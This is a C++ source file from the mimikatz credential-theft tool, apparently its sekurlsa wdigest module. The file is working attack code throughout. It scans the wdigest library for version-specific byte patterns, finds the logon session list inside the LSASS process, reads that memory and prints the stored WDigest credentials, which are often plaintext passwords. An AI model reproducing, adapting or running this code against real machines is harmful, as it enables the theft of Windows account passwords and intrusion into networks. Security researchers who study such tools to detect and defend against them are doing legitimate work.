/*	Benjamin DELPY `gentilkiwi`
	http://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence    : http://creativecommons.org/licenses/by/3.0/fr/
	Ce fichier : http://creativecommons.org/licenses/by/3.0/fr/
*/
#include "wdigest.h"
#include "..\..\global.h"
mod_process::PKIWI_VERY_BASIC_MODULEENTRY mod_mimikatz_sekurlsa_wdigest::pModWDIGEST = NULL;
mod_mimikatz_sekurlsa_wdigest::PKIWI_WDIGEST_LIST_ENTRY mod_mimikatz_sekurlsa_wdigest::l_LogSessList = NULL;
long mod_mimikatz_sekurlsa_wdigest::offsetWDigestPrimary = 0;

bool mod_mimikatz_sekurlsa_wdigest::getWDigest(vector<wstring> * arguments)
{
	vector<pair<mod_mimikatz_sekurlsa::PFN_ENUM_BY_LUID, wstring>> monProvider;
	monProvider.push_back(make_pair<mod_mimikatz_sekurlsa::PFN_ENUM_BY_LUID, wstring>(getWDigestLogonData, wstring(L"wdigest")));
	return mod_mimikatz_sekurlsa::getLogonData(arguments, &monProvider);
}

bool mod_mimikatz_sekurlsa_wdigest::searchWDigestEntryList()
{
#ifdef _M_X64
	BYTE PTRN_WNO8_InsertInLogSess[]= {0x4c, 0x89, 0x1b, 0x48, 0x89, 0x43, 0x08, 0x49, 0x89, 0x5b, 0x08, 0x48, 0x8d};
	BYTE PTRN_W8CP_InsertInLogSess[]= {0x4c, 0x89, 0x1b, 0x48, 0x89, 0x4b, 0x08, 0x49, 0x8b, 0x43, 0x08, 0x4c, 0x39};
	BYTE PTRN_W8RP_InsertInLogSess[]= {0x4c, 0x89, 0x1b, 0x48, 0x89, 0x43, 0x08, 0x49, 0x39, 0x43, 0x08, 0x0f, 0x85};
#elif defined _M_IX86
	BYTE PTRN_WNO8_InsertInLogSess[]= {0x8b, 0x45, 0x08, 0x89, 0x08, 0xc7, 0x40, 0x04};
	BYTE PTRN_W8CP_InsertInLogSess[]= {0x89, 0x0e, 0x89, 0x56, 0x04, 0x8b, 0x41, 0x04};
	BYTE PTRN_W8RP_InsertInLogSess[]= {0x89, 0x06, 0x89, 0x4e, 0x04, 0x39, 0x48, 0x04};
#endif
	LONG OFFS_WALL_InsertInLogSess	= -4;

	if(mod_mimikatz_sekurlsa::searchLSASSDatas() && pModWDIGEST && !l_LogSessList)
	{
		PBYTE *pointeur = NULL; PBYTE pattern = NULL; ULONG taille = 0; LONG offset = 0;

		pointeur= reinterpret_cast<PBYTE *>(&l_LogSessList);
		offset	= OFFS_WALL_InsertInLogSess;
		if(mod_system::GLOB_Version.dwBuildNumber < 8000)
		{
			pattern	= PTRN_WNO8_InsertInLogSess;
			taille	= sizeof(PTRN_WNO8_InsertInLogSess);
		}
		else if(mod_system::GLOB_Version.dwBuildNumber < 8400)
		{
			pattern	= PTRN_W8CP_InsertInLogSess;
			taille	= sizeof(PTRN_W8CP_InsertInLogSess);
		}
		else
		{
			pattern	= PTRN_W8RP_InsertInLogSess;
			taille	= sizeof(PTRN_W8RP_InsertInLogSess);
		}

		if(HMODULE monModule = LoadLibrary(L"wdigest"))
		{
			MODULEINFO mesInfos;
			if(GetModuleInformation(GetCurrentProcess(), monModule, &mesInfos, sizeof(MODULEINFO)))
			{
				mod_memory::genericPatternSearch(pointeur, L"wdigest", pattern, taille, offset, "SpInstanceInit", false);
				*pointeur += pModWDIGEST->modBaseAddr - reinterpret_cast<PBYTE>(mesInfos.lpBaseOfDll);
			}
			FreeLibrary(monModule);
		}

#ifdef _M_X64
		offsetWDigestPrimary = ((mod_system::GLOB_Version.dwMajorVersion < 6) ? ((mod_system::GLOB_Version.dwMinorVersion < 2) ? 36 : 48) : 48);
#elif defined _M_IX86
		offsetWDigestPrimary = ((mod_system::GLOB_Version.dwMajorVersion < 6) ? ((mod_system::GLOB_Version.dwMinorVersion < 2) ? 36 : 28) : 32);
#endif
	}
	return (pModWDIGEST && l_LogSessList);
}

bool WINAPI mod_mimikatz_sekurlsa_wdigest::getWDigestLogonData(__in PLUID logId, __in bool justSecurity)
{
	if(searchWDigestEntryList())
	{
		PKIWI_GENERIC_PRIMARY_CREDENTIAL mesCreds = NULL;
		DWORD taille = offsetWDigestPrimary + sizeof(KIWI_GENERIC_PRIMARY_CREDENTIAL);
		BYTE * monBuff = new BYTE[taille];
		if(PLIST_ENTRY pLogSession = mod_mimikatz_sekurlsa::getPtrFromLinkedListByLuid(reinterpret_cast<PLIST_ENTRY>(l_LogSessList), FIELD_OFFSET(KIWI_WDIGEST_LIST_ENTRY, LocallyUniqueIdentifier), logId))
			if(	mod_memory::readMemory(pLogSession, monBuff, taille, mod_mimikatz_sekurlsa::hLSASS))
				mesCreds = reinterpret_cast<PKIWI_GENERIC_PRIMARY_CREDENTIAL>(reinterpret_cast<PBYTE>(monBuff) + offsetWDigestPrimary);
		mod_mimikatz_sekurlsa::genericCredsToStream(mesCreds, justSecurity);
		delete [] monBuff;
	}
	else (*outputStream) << L"n.a. (wdigest KO)";

	return true;
}
